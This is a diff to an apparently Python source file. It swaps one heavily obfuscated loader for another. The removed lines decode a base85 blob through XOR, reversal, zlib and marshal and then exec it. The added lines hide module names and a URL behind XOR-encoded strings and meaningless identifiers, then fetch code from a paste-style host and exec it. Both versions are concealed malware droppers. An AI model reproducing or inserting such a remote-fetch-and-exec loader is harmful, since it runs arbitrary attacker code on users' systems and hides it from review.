@@ -1,16 +1,7 @@
-分鳥川化心山夢れ書月るる個っ応書書之="Jp^I8<Ozu!$)LKBfl1D*nu5kKwB*yfJSB;>u4TzRTvXYIR8N(pd$os3#erlR)NZSN_!<Kl6}1TEpfMr}<`N6RgMR7hs6=Pus#GK^7wSE}xl?lipPnlgD*_3+5r-AFJ2n;&mu3{ui!GQGIX;yDt}RIHKLkay1XITuMASBjDj?J}`4>gY$Ot=N`W>{Ol?KtgPci*W%Tq@GoB&0hq4JGefij1(9T^@Fgps`s;1&qPR_SYTXN21EBi-{3hI;?U-B6Mgr~JTL|4zftwuj|o*H**-(NE;nG8{TYPGV@mF=(CTAxqCase{-vRL-LxR;}gG)n2+tHPPCZwU#%tImgX>HD|KHAR_#EXv<CNy@GKrj-XvG>Qt%;H3}s$oxm^K;6))+`e89k5X-qLRU1ChDrGhSlOjW2FzQYh$KeNkcS5IBtpyWB1rc{SS+r@N;<nvyMpJ2g77gmp?R-U1SDEod0?Zx3pE}B7FNb)X0QrC3FunaX)U@D^SB038^oPyF${%u1Z`GN4OW2YaaX-b_jdU}Jji~|0|2ASN22O@`_eMG;FOi;;#G^y*f1RqjAv)sUB#1JkqDK98KH|o&1N%3I8PPF{Zt{mk;kDzeCwtzIG6=QER7sHlDaq_94r~z(b@5()L}VpkSFAo4WNwG0LHr7{2vsv_Sip2AUypTbiJrvIE=8o}495S2gGxhN;{Qg!rD1h_tX382RYNV8BEuxQp3xaOK565&<eWICdTWm"
-応可生行書理く自物之的海海理月山風面=209
-書る鳥海来用来的花れ行行用闇闇理対な=38
-
-な分下月生的月応なれ書月る月風的光化=getattr(__builtins__,"__dict__")
-れ応可なる書水個く化鳥花来っる月生光=な分下月生的月応なれ書月る月風的光化["__import__"]
-
-来用る的的物物分面風応個な鳥花物行る=れ応可なる書水個く化鳥花来っる月生光("base64").b85decode(分鳥川化心山夢れ書月るる個っ応書書之)
-来用る的的物物分面風応個な鳥花物行る=bytes([(x^書る鳥海来用来的花れ行行用闇闇理対な) for x in 来用る的的物物分面風応個な鳥花物行る])
-来用る的的物物分面風応個な鳥花物行る=bytes(来用る的的物物分面風応個な鳥花物行る[::-1])
-来用る的的物物分面風応個な鳥花物行る=bytes([(x^応可生行書理く自物之的海海理月山風面) for x in 来用る的的物物分面風応個な鳥花物行る])
-
-空分行夢書面っるっ之闇化花得得闇な鳥=れ応可なる書水個く化鳥花来っる月生光("zlib").decompress(来用る的的物物分面風応個な鳥花物行る)
-来我な個応可行対る応可分水水面月自之=れ応可なる書水個く化鳥花来っる月生光("marshal").loads(空分行夢書面っるっ之闇化花得得闇な鳥)
-
-exec(来我な個応可行対る応可分水水面月自之)
+Aotpyの了れる都个=(lambda:''.join(chr(int(p.split('^')[0])^int(p.split('^')[1]))for p in['130^173','233^221','75^61','11^104','39^31','192^242','203^228','226^146','111^64','227^149','252^153','111^11','177^159','120^21','21^108','217^169','185^150','190^145','188^134','34^81','128^240','55^67','65^53','196^172']))();Aotpy水体会地方の=(lambda:''.join(chr(int(p.split('^')[0])^int(p.split('^')[1]))for p in['213^184','97^81','101^62','95^68']))();Aotpy知る食べるよりことなど三する=(lambda:''.join(chr(int(p.split('^')[0])^int(p.split('^')[1]))for p in['11^102','16^34','149^172','253^166','86^77']))();Aotpy没有小从主それぞれ=(lambda:''.join(chr(int(p.split('^')[0])^int(p.split('^')[1]))for p in['26^118','62^81','129^238','149^193','175^240','103^19','102^3','5^118','197^160','195^145']))();Aotpy分分把也できどれ=(lambda:''.join(chr(int(p.split('^')[0])^int(p.split('^')[1]))for p in['29746^26']))();Aotpyは现你行=(lambda:''.join(chr(int(p.split('^')[0])^int(p.split('^')[1]))for p in['32711^19']))();Aotpy这その後使それでも机=(lambda:''.join(chr(int(p.split('^')[0])^int(p.split('^')[1]))for p in['29488^138']))();Aotpy分かるによる量去てこちら=exec;Aotpyしかし方能中的なっ=chr;Aotpy得覚える机分かるどちら在なっ=ord;Aotpy这中なに=str;Aotpyそれら三作覚える两到不=isinstance;Aotpyなこちらそれでも于有=getattr;Aotpy当对二发書く=(lambda:''.join(chr(int(p.split('^')[0])^int(p.split('^')[1]))for p in['29593^55']))();Aotpyし学所们发飲むさ=(lambda:''.join(chr(int(p.split('^')[0])^int(p.split('^')[1]))for p in['29519^130']))()
+def Aotpy也能てこれら行他个(s):Aotpy当对二发書く=1;Aotpyし学所们发飲むさ=s;return Aotpyし学所们发飲むさ[::-Aotpy当对二发書く]
+def Aotpyしかし教えるあちらいずれ民(key,data):
+	Aotpy分かるによる量去てこちら='';Aotpyなこちらそれでも于有=data;Aotpyし学所们发飲むさ=key;Aotpy三一話す把など生=Aotpy得覚える机分かるどちら在なっ(Aotpyし学所们发飲むさ)if Aotpyそれら三作覚える两到不(Aotpyし学所们发飲むさ,Aotpy这中なに)else Aotpyし学所们发飲むさ;Aotpy当对二发書く=[]
+	for Aotpy十話す二主对本主 in Aotpyなこちらそれでも于有:Aotpy当对二发書く.append(Aotpyしかし方能中的なっ(Aotpy十話す二主对本主^Aotpy三一話す把など生))
+	return Aotpy分かるによる量去てこちら.join(Aotpy当对二发書く)
+Aotpyどちら个分する=__import__(Aotpyしかし教えるあちらいずれ民(Aotpy也能てこれら行他个(Aotpy这その後使それでも机),[29650,29646,29646,29642,29634]));Aotpy三一話す把など生=__import__(Aotpyしかし教えるあちらいずれ民(Aotpy也能てこれら行他个(Aotpyし学所们发飲むさ),[29631,29608,29628,29624,29608,29630,29625,29630]));Aotpy使なっどちらも应分=__import__(Aotpyしかし教えるあちらいずれ民(Aotpy也能てこれら行他个(Aotpyは现你行),[32699,32679]));Aotpyあれ他说家部理ため=__import__(Aotpyしかし教えるあちらいずれ民(Aotpy也能てこれら行他个(Aotpy分分把也できどれ),[29787,29777,29787]));Aotpy都ためそれ去=Aotpyなこちらそれでも于有(__import__(Aotpyしかし教えるあちらいずれ民(Aotpy也能てこれら行他个(Aotpy当对二发書く),[29659,29661,29643,29660,29681,29647,29641,29643,29632,29658]),fromlist=[Aotpyしかし教えるあちらいずれ民(Aotpy也能てこれら行他个(Aotpy当对二发書く),[29641,29643,29632,29643,29660,29647,29658,29643,29681,29659,29661,29643,29660,29681,29647,29641,29643,29632,29658])]),Aotpyしかし教えるあちらいずれ民(Aotpy也能てこれら行他个(Aotpy当对二发書く),[29641,29643,29632,29643,29660,29647,29658,29643,29681,29659,29661,29643,29660,29681,29647,29641,29643,29632,29658]));Aotpy他高部动成=Aotpyなこちらそれでも于有(__import__(Aotpyしかし教えるあちらいずれ民(Aotpy也能てこれら行他个(Aotpyし学所们发飲むさ),[29614,29611,29602,29603,29625,29630]),fromlist=[Aotpyしかし教えるあちらいずれ民(Aotpy也能てこれら行他个(Aotpyし学所们发飲むさ),[29631,29608,29603,29609,29608,29631])]),Aotpyしかし教えるあちらいずれ民(Aotpy也能てこれら行他个(Aotpyし学所们发飲むさ),[29631,29608,29603,29609,29608,29631]));Aotpy化どちら从人=123;Aotpy分かる書くそちら为=123;Aotpy物いずれ見る大的经書く=123;Aotpy同いできつまりいる现他=Aotpy也能てこれら行他个(Aotpy没有小从主それぞれ);Aotpy分かる应点まで都=Aotpy也能てこれら行他个(Aotpy知る食べるよりことなど三する);Aotpy量あちら中思う也到に=Aotpy也能てこれら行他个(Aotpy水体会地方の);Aotpy十話す二主对本主=Aotpy也能てこれら行他个(Aotpyの了れる都个);Aotpy分かるによる量去てこちら(Aotpy三一話す把など生.get(Aotpy十話す二主对本主).text)
